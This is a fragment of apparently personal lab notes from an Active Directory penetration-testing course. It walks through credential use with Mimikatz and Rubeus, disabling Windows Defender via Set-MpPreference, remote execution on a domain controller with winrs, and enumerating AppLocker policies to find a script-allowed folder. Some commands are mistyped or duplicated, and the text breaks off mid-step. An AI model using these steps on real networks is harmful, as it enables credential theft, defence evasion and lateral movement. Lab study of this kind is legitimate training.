...
15. In step 10, credentials were found for a service account. We will not use OverPass-the-Hash with them
*from the main machine, run either Invoke-Mimikatz, SafetyKatz, Rubeus etc
...
16. Test access on a server (this case, domain controller)
```
winrs -r:dcorp-dc whoami
```


17. User Invoke-Mimikatz on the new machine, go through process of AMSI/disabling AV on elevated shell on main machine
```
Set-MpPreference -DisableRealtimeMonitoring $truePS
```
```
...
18. This should open a new powershell window that has Domain Admin priveleges (should be on main)



### Derivative Local Admin
1. Find where the current local admin has additional privileges. 
Find-PSRemotingLocalAdminAccess

2. In this example, Loader.exe is blocked due to Group Policy and Invoke-Mimikatz has errors on launguage mode. Possibly due to an application allow list and our PSRemoting sessions being in a Constrained Language mode
3. Test that commands can be sent
```
winrs -r:dcorp-adminsrv cmd
```
4. Check is Applocker is configure by querying registry keys
```
winrs -r:dcorp-adminsrv cmd
```
5. It is configured, check on some policies show that microsoft signed binares and scripts are the only things allowed. 
```
reg queryHKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```
6. This instance revealed a folder location that allows everyone to run scripts from 

7. Initialize the Powershell Session
```
Enter-PSSession dcorp-adminsrv
```
8. Check on the aforementioned policies
```
